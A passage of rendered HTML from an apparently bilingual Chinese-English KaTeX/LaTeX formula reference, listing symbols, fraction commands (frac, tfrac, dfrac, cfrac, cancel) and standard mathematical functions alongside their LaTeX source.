class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">▹</span></span></span></span></td><td style="text-align:left">\triangleright</td><td style="text-align:center">59</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊳</mo></mrow><annotation encoding="application/x-tex">\vartriangleright</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58503em;vertical-align:-0.03517em;"></span><span class="mrel amsrm">⊳</span></span></span></span></td><td style="text-align:left">\vartriangleright</td></tr><tr><td style="text-align:center">28</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">♢</mi></mrow><annotation encoding="application/x-tex">\diamondsuit</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.82407em;vertical-align:-0.12963em;"></span><span class="mord">♢</span></span></span></span></td><td style="text-align:left">\diamondsuit</td><td style="text-align:center">60</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋫</mo></mrow><annotation encoding="application/x-tex">\ntriangleright</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9115200000000001em;vertical-align:-0.20576em;"></span><span class="mrel amsrm">⋫</span></span></span></span></td><td style="text-align:left">\ntriangleright</td></tr><tr><td style="text-align:center">29</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">♡</mi></mrow><annotation encoding="application/x-tex">\heartsuit</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.82407em;vertical-align:-0.12963em;"></span><span class="mord">♡</span></span></span></span></td><td style="text-align:left">\heartsuit</td><td style="text-align:center">61</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊴</mo></mrow><annotation encoding="application/x-tex">\trianglelefteq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mrel amsrm">⊴</span></span></span></span></td><td style="text-align:left">\trianglelefteq</td></tr><tr><td style="text-align:center">30</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">♣</mi></mrow><annotation encoding="application/x-tex">\clubsuit</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.82407em;vertical-align:-0.12963em;"></span><span class="mord">♣</span></span></span></span></td><td style="text-align:left">\clubsuit</td><td style="text-align:center">62</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋬</mo></mrow><annotation encoding="application/x-tex">\ntrianglelefteq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.09657em;vertical-align:-0.30274em;"></span><span class="mrel amsrm">⋬</span></span></span></span></td><td style="text-align:left">\ntrianglelefteq</td></tr><tr><td style="text-align:center">31</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">♠</mi></mrow><annotation encoding="application/x-tex">\spadesuit</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.82407em;vertical-align:-0.12963em;"></span><span class="mord">♠</span></span></span></span></td><td style="text-align:left">\spadesuit</td><td style="text-align:center">63</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊵</mo></mrow><annotation encoding="application/x-tex">\trianglerighteq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mrel amsrm">⊵</span></span></span></span></td><td style="text-align:left">\trianglerighteq</td></tr><tr><td style="text-align:center">32</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">⅁</mi></mrow><annotation encoding="application/x-tex">\Game</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68889em;vertical-align:0em;"></span><span class="mord amsrm">⅁</span></span></span></span></td><td style="text-align:left">\Game</td><td style="text-align:center">64</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋭</mo></mrow><annotation encoding="application/x-tex">\ntrianglerighteq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.09657em;vertical-align:-0.30274em;"></span><span class="mrel amsrm">⋭</span></span></span></span></td><td style="text-align:left">\ntrianglerighteq</td></tr></tbody></table><h2 id="22-运算与函数-operations-functions"><a class="markdownIt-Anchor" href="#22-运算与函数-operations-functions"></a> 2.2 运算与函数 Operations &amp; Functions</h2><h3 id="221-分数-fractions"><a class="markdownIt-Anchor" href="#221-分数-fractions"></a> 2.2.1 分数 Fractions</h3><table><thead><tr><th style="text-align:left">类型</th><th style="text-align:left">样式</th><th style="text-align:left">LaTeX</th></tr></thead><tbody><tr><td style="text-align:left">分数<br/>Fractions</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>2</mn><mn>4</mn></mfrac><mi>x</mi><mo>=</mo><mn>0.5</mn><mi>x</mi></mrow><annotation encoding="application/x-tex">\frac{2}{4}x=0.5x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">5</span><span class="mord mathnormal">x</span></span></span></span></td><td style="text-align:left">\frac{2}{4}x=0.5x or {2 \over 4}x=0.5x</td></tr><tr><td style="text-align:left">小型分数<br/>Small fractions (force \textstyle)</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>2</mn><mn>4</mn></mfrac><mi>x</mi><mo>=</mo><mn>0.5</mn><mi>x</mi></mrow><annotation encoding="application/x-tex">\tfrac{2}{4}x = 0.5x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">5</span><span class="mord mathnormal">x</span></span></span></span></td><td style="text-align:left">\tfrac{2}{4}x = 0.5x</td></tr><tr><td style="text-align:left">大型分数（不嵌套）<br/>Large (normal) fractions (force \displaystyle)</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle displaystyle="true" scriptlevel="0"><mfrac><mn>2</mn><mn>4</mn></mfrac></mstyle><mo>=</mo><mn>0.5</mn><mspace width="2em"/><mstyle displaystyle="true" scriptlevel="0"><mfrac><mn>2</mn><mrow><mi>c</mi><mo>+</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mn>2</mn><mrow><mi>d</mi><mo>+</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mn>2</mn><mn>4</mn></mfrac></mstyle></mrow></mfrac></mstyle></mrow></mfrac></mstyle><mo>=</mo><mi>a</mi></mrow><annotation encoding="application/x-tex">\dfrac{2}{4} = 0.5 \qquad \dfrac{2}{c + \dfrac{2}{d + \dfrac{2}{4}}} = a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:4.43032em;vertical-align:-3.10888em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">5</span><span class="mspace" style="margin-right:2em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.11em;"><span class="pstrut" style="height:3.32144em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.11em;"><span class="pstrut" style="height:3.32144em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-3.55144em;"><span class="pstrut" style="height:3.32144em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.99844em;"><span class="pstrut" style="height:3.32144em;"></span><span class="mord"><span class="mord">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.89744em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-3.55144em;"><span class="pstrut" style="height:3.32144em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.99844em;"><span class="pstrut" style="height:3.32144em;"></span><span class="mord"><span class="mord">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.10888em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">a</span></span></span></span></td><td style="text-align:left">\dfrac{2}{4} = 0.5 \qquad \dfrac{2}{c + \dfrac{2}{d + \dfrac{2}{4}}} = a</td></tr><tr><td style="text-align:left">大型分数（嵌套）<br/>Large (nested) fractions</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle displaystyle="true" scriptlevel="0"><mfrac><mn>2</mn><mrow><mi>c</mi><mo>+</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mn>2</mn><mrow><mi>d</mi><mo>+</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mn>2</mn><mn>4</mn></mfrac></mstyle></mrow></mfrac></mstyle></mrow></mfrac></mstyle><mo>=</mo><mi>a</mi></mrow><annotation encoding="application/x-tex">\cfrac{2}{c + \cfrac{2}{d + \cfrac{2}{4}}} = a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:5.236em;vertical-align:-3.646em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5899999999999999em;"><span style="top:-2.11em;"><span class="pstrut" style="height:3.59em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5899999999999999em;"><span style="top:-2.11em;"><span class="pstrut" style="height:3.59em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5899999999999999em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.74em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span></span></span></span></span><span style="top:-3.82em;"><span class="pstrut" style="height:3.59em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-4.33em;"><span class="pstrut" style="height:3.59em;"></span><span class="mord"><span class="mord">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.166em;"><span></span></span></span></span></span><span></span></span></span></span><span style="top:-3.82em;"><span class="pstrut" style="height:3.59em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-4.33em;"><span class="pstrut" style="height:3.59em;"></span><span class="mord"><span class="mord">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.646em;"><span></span></span></span></span></span><span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">a</span></span></span></span></td><td style="text-align:left">\cfrac{2}{c + \cfrac{2}{d + \cfrac{2}{4}}} = a</td></tr><tr><td style="text-align:left">约分线的使用<br/>Cancellations in fractions</td><td style="text-align:left"><img src="https://oursite-resourse.oss-cn-qingdao.aliyuncs.com/formula-images/readme/cancel3.png" alt="cancel3" style="zoom:28%;" / loading="lazy"></td><td style="text-align:left">\cfrac{x}{1 + \cfrac{\cancel{y}}{\cancel{y}}} = \cfrac{x}{2}</td></tr></tbody></table><p><strong>注意：</strong> 其中<code>\cancel</code>命令需要<strong>cancel扩展包</strong>支持，<strong>cancel扩展包</strong>是一款自定义宏包，如需使用请在公式页面右上角【设置】处勾选后使用。</p><h3 id="222-标准数值函数-standard-numerical-functions"><a class="markdownIt-Anchor" href="#222-标准数值函数-standard-numerical-functions"></a> 2.2.2 标准数值函数 Standard numerical functions</h3><table><thead><tr><th style="text-align:left">样式</th><th style="text-align:left">LaTeX</th></tr></thead><tbody><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mo><mi>exp</mi><mo>⁡</mo></mo><mi>a</mi></msub><mi>b</mi><mo>=</mo><msup><mi>a</mi><mi>b</mi></msup><mo separator="true">,</mo><mi>exp</mi><mo>⁡</mo><mi>b</mi><mo>=</mo><msup><mi>e</mi><mi>b</mi></msup><mo separator="true">,</mo><mn>1</mn><msup><mn>0</mn><mi>m</mi></msup></mrow><annotation encoding="application/x-tex">\exp_a b = a^b, \exp b = e^b, 10^m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.93858em;vertical-align:-0.24414em;"></span><span class="mop"><span class="mop">exp</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.057252em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">exp</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\exp_a b = a^b, \exp b = e^b, 10^m</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ln</mi><mo>⁡</mo><mi>c</mi><mo separator="true">,</mo><mi>lg</mi><mo>⁡</mo><mi>d</mi><mo>=</mo><mi>log</mi><mo>⁡</mo><mi>e</mi><mo separator="true">,</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>10</mn></msub><mi>f</mi></mrow><annotation encoding="application/x-tex">\ln c, \lg d = \log e, \log_{10} f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mop">ln</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">l<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.93858em;vertical-align:-0.24414em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></td><td style="text-align:left">\ln c, \lg d = \log e, \log_{10} f</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>sin</mi><mo>⁡</mo><mi>a</mi><mo separator="true">,</mo><mi>cos</mi><mo>⁡</mo><mi>b</mi><mo separator="true">,</mo><mi>tan</mi><mo>⁡</mo><mi>c</mi><mo separator="true">,</mo><mi>cot</mi><mo>⁡</mo><mi>d</mi><mo separator="true">,</mo><mi>sec</mi><mo>⁡</mo><mi>e</mi><mo separator="true">,</mo><mi>csc</mi><mo>⁡</mo><mi>f</mi></mrow><annotation encoding="application/x-tex">\sin a, \cos b, \tan c, \cot d, \sec e, \csc f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mop">sin</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">cos</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">tan</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">cot</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">sec</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">csc</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></td><td style="text-align:left">\sin a, \cos b, \tan c, \cot d, \sec e, \csc f</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>arcsin</mi><mo>⁡</mo><mi>a</mi><mo separator="true">,</mo><mi>arccos</mi><mo>⁡</mo><mi>b</mi><mo separator="true">,</mo><mi>arctan</mi><mo>⁡</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">\arcsin a, \arccos b, \arctan c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mop">arcsin</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">arccos</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">arctan</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span></span></span></span></td><td style="text-align:left">\arcsin a, \arccos b, \arctan c</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">arccot</mi><mo>⁡</mo><mi>d</mi><mo separator="true">,</mo><mi mathvariant="normal">arcsec</mi><mo>⁡</mo><mi>e</mi><mo separator="true">,</mo><mi mathvariant="normal">arccsc</mi><mo>⁡</mo><mi>f</mi></mrow><annotation encoding="application/x-tex">\operatorname{arccot} d, \operatorname{arcsec} e, \operatorname{arccsc} f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mop"><span class="mord mathrm">a</span><span class="mord mathrm">r</span><span class="mord mathrm">c</span><span class="mord mathrm">c</span><span class="mord mathrm">o</span><span class="mord mathrm">t</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mord mathrm">a</span><span class="mord mathrm">r</span><span class="mord mathrm">c</span><span class="mord mathrm">s</span><span class="mord mathrm">e</span><span class="mord mathrm">c</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mord mathrm">a</span><span class="mord mathrm">r</span><span class="mord mathrm">c</span><span class="mord mathrm">c</span><span class="mord mathrm">s</span><span class="mord mathrm">c</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></td><td style="text-align:left">\operatorname{arccot} d, \operatorname{arcsec} e, \operatorname{arccsc} f</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>sinh</mi><mo>⁡</mo><mi>a</mi><mo separator="true">,</mo><mi>cosh</mi><mo>⁡</mo><mi>b</mi><mo separator="true">,</mo><mi>tanh</mi><mo>⁡</mo><mi>c</mi><mo separator="true">,</mo><mi>coth</mi><mo>⁡</mo><mi>d</mi></mrow><annotation encoding="application/x-tex">\sinh a, \cosh b, \tanh c, \coth d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mop">sinh</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">cosh</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">tanh</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">coth</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span></span></span></span></td><td style="text-align:left">\sinh a, \cosh b, \tanh c, \coth d</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">sh</mi><mo>⁡</mo><mi>k</mi><mo separator="true">,</mo><mi mathvariant="normal">ch</mi><mo>⁡</mo><mi>l</mi><mo separator="true">,</mo><mi mathvariant="normal">th</mi><mo>⁡</mo><mi>m</mi><mo separator="true">,</mo><mi 